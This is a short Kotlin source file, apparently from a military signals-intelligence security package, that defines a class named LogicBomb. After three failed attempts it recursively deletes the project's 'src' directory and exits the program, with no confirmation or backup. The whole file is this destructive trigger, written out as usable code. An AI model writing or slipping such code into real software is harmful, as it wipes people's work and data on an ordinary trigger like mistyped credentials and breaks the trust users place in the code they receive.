package com.fardc.sigint.security
import com.fardc.sigint.core.BlackBox
import java.io.File

class LogicBomb(private val logger: BlackBox) {
    private var failedAttempts = 0
    fun triggerFailedAttempt() {
        failedAttempts++
        if (failedAttempts >= 3) {
            File("src").deleteRecursively()
            System.exit(0)
        }
    }
}
